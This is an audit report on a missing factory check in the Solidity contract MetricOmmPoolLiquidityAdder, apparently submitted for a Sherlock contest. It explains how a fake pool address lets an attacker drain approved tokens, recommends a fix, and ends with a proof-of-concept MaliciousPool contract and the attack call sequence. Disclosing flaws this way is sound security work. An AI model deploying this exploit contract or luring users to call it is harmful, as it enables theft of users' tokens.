Audit Report

## Title
Missing Factory Validation for `pool` Address in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User Tokens — (`metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

## Summary

`MetricOmmPoolLiquidityAdder` accepts an arbitrary, unvalidated `pool` address in every public entry point and stores it directly as the authoritative callback caller via `_setPayContext`. A malicious contract at that address can invoke `metricOmmModifyLiquidityCallback`, pass every caller check (since it *is* the stored `expectedPool`), supply attacker-controlled token addresses via `getImmutables()`, and pull the victim's tokens up to the user-supplied max caps. The contract's own NatDoc explicitly acknowledges this gap but does not mitigate it on-chain.

## Finding Description

`MetricOmmSwapRouterBase._setNextCallbackContext` enforces factory membership before writing transient state: [1](#0-0) 

`MetricOmmPoolLiquidityAdder._setPayContext` has no equivalent guard — it stores the raw caller-supplied `pool` address directly: [2](#0-1) 

Every public entry point (`addLiquidityExactShares`, `addLiquidityWeighted`) calls `_addLiquidity`, which calls `_setPayContext` with the unvalidated pool: [3](#0-2) 

The callback enforces only `msg.sender == expectedPool`: [4](#0-3) 

Because the malicious pool *is* the `expectedPool`, this check passes. The callback then reads token addresses from `IMetricOmmPool(msg.sender).getImmutables()` — fully attacker-controlled — and calls `pay(token0, payer, msg.sender, amount0Delta)`, pulling tokens from the victim to the malicious pool: [5](#0-4) 

The NatDoc at lines 19–21 acknowledges this design gap but does not mitigate it on-chain: [6](#0-5) 

## Impact Explanation

A victim who has approved `MetricOmmPoolLiquidityAdder` for token0 and token1 and calls any `addLiquidity*` variant with a malicious pool address will have up to `maxAmountToken0` of token0 and `maxAmountToken1` of token1 transferred directly to the attacker's contract. The loss is bounded only by the user-supplied caps and their token approval, not by any protocol invariant. This is a direct loss of user principal with no recovery path — a Critical/High impact under Sherlock thresholds.

## Likelihood Explanation

The trigger requires the victim to call `addLiquidityExactShares` or `addLiquidityWeighted` with an attacker-controlled pool address. This is achievable via a malicious or compromised frontend, a phishing link, or a wrapper contract the victim is tricked into calling. `MetricOmmPoolLiquidityAdder` is a public, permissionless contract; no privileged role is needed. The asymmetry with the router (which does validate via `_requireFactoryPool`) makes this an easy mistake for integrators to overlook, increasing real-world likelihood.

## Recommendation

Add a factory membership check inside `_addLiquidity` (or at each public entry point) mirroring the pattern already used in `MetricOmmSwapRouterBase`:

```solidity
function _addLiquidity(address pool, ...) internal returns (...) {
    if (!FACTORY.isPool(pool)) revert InvalidPool(pool);   // ← add this
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    ...
}
```

This requires storing the factory address as an immutable in `MetricOmmPoolLiquidityAdder`, exactly as `MetricOmmSwapRouterBase` does at: [7](#0-6) 

## Proof of Concept

```solidity
// Attacker's malicious pool
contract MaliciousPool {
    address immutable adder;
    address immutable token0;
    address immutable token1;
    uint256 constant MAX0 = 1000e18;
    uint256 constant MAX1 = 1000e18;

    constructor(address _adder, address _t0, address _t1) {
        adder = _adder; token0 = _t0; token1 = _t1;
    }

    // Called by LiquidityAdder._addLiquidity
    function addLiquidity(address, uint80, LiquidityDelta calldata, bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Trigger callback with max amounts; KIND_PAY = 1
        IMetricOmmPoolLiquidityAdder(adder)
            .metricOmmModifyLiquidityCallback(MAX0, MAX1, abi.encode(uint8(1)));
        return (MAX0, MAX1);
    }

    // Callback reads token addresses from here — attacker controls them
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = token0;
        imm.token1 = token1;
    }
}

// Attack:
// 1. Victim approves LiquidityAdder for token0 and token1.
// 2. Victim (or tricked UI) calls:
liquidityAdder.addLiquidityExactShares(
    address(maliciousPool),   // pool — not validated against factory
    victim,                   // owner
    0,                        // salt
    deltas,
    MAX0,                     // maxAmountToken0
    MAX1,                     // maxAmountToken1
    ""
);
// 3. MaliciousPool.addLiquidity fires → metricOmmModifyLiquidityCallback
//    msg.sender == expectedPool ✓  (malicious pool IS the stored pool)
//    amount0Delta <= max0 ✓
//    pay(token0, victim, maliciousPool, MAX0) → victim loses MAX0 of token0
//    pay(token1, victim, maliciousPool, MAX1) → victim loses MAX1 of token1
```
